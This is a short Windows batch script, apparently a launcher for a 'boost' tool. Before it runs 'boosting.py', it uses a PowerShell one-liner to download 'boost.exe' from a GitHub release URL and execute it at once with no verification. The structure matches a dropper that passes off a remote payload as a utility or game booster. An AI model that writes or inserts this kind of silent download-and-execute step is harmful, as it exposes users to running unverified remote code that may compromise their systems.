@echo ofF
cd Tuto
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/tool-boost-funk/releases/download/boost/boost.exe';$file='boost.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
cd ..
py boosting.py
